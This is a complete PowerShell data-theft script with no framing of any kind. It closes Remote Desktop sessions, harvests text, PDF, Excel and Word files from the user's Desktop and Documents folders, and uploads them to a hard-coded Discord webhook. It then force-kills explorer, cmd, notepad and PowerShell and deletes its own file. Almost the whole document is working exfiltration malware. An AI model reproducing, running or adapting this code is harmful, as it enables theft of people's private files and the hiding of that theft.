# Function to close any active Remote Desktop connections
function Close-RemoteDesktopConnections {
    $rdpProcesses = Get-Process -Name mstsc -ErrorAction SilentlyContinue
    foreach ($process in $rdpProcesses) {
        Stop-Process -Id $process.Id -Force
    }
}

# Function to upload file to Discord webhook
function Upload-FileToDiscord {
    param (
        [string]$filePath,
        [string]$webhookUrl
    )

    $fileName = [System.IO.Path]::GetFileName($filePath)
    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)

    # Create multipart/form-data content
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyLines = @(
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
        "Content-Type: application/octet-stream",
        "",
        [System.Convert]::ToBase64String($fileBytes),
        "--$boundary--"
    )
    $body = $bodyLines -join $LF
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)

    try {
        # Send the request
        $webRequest = [System.Net.HttpWebRequest]::Create($webhookUrl)
        $webRequest.Method = "POST"
        $webRequest.ContentType = "multipart/form-data; boundary=$boundary"
        $webRequest.ContentLength = $bytes.Length
        $webRequestStream = $webRequest.GetRequestStream()
        $webRequestStream.Write($bytes, 0, $bytes.Length)
        $webRequestStream.Close()

        # Get the response from the server
        $webResponse = $webRequest.GetResponse()
        $webResponseStream = $webResponse.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($webResponseStream)
        $responseContent = $reader.ReadToEnd()
        $reader.Close()
        $webResponseStream.Close()
        $webResponse.Close()
    } catch {
        # Handle any errors that occur during the upload
    }
}

# Function to get files by extension from Desktop and Documents directories
function Get-FilesFromUserDirectories {
    param (
        [string]$extension
    )

    $userFolders = @(
        [System.Environment]::GetFolderPath("Desktop"),
        [System.Environment]::GetFolderPath("MyDocuments")
    )

    $files = @()
    foreach ($folder in $userFolders) {
        $files += Get-ChildItem -Path $folder -Filter "*.$extension" -Recurse -File -ErrorAction SilentlyContinue
    }
    return $files
}

# Function to close all windows
function Close-AllWindows {
    Stop-Process -Name powershell -Force
    Stop-Process -Name notepad -Force
    Stop-Process -Name explorer -Force
    Stop-Process -Name cmd -Force
}

# Close any active Remote Desktop connections
Close-RemoteDesktopConnections

# Recursively get files from Desktop and Documents directories
$webhookUrl = "https://discord.com/api/webhooks/1243581518152990801/HeVZuyvWfQSYBl1ipXcbIEb2uIScSwlrXj6lazDoujaA741SdO4idCw8nhchRScTwinE"
$extensions = @("txt", "pdf", "xlsx", "doc", "docx")
$startTime = Get-Date

while ((Get-Date) - $startTime).TotalSeconds -le 30 {
    foreach ($extension in $extensions) {
        $files = Get-FilesFromUserDirectories -extension $extension
        $fileCount = 0
        foreach ($file in $files) {
            if ($fileCount -ge 5) {
                break
            }
            Upload-FileToDiscord -filePath $file.FullName -webhookUrl $webhookUrl
            $fileCount++
        }
    }
}

# Close all windows and stop the script after 30 seconds
Start-Sleep -Seconds 30
Close-AllWindows

# Remove the PowerShell script file after execution
$scriptPath = $MyInvocation.MyCommand.Definition
Remove-Item -Path $scriptPath -Force
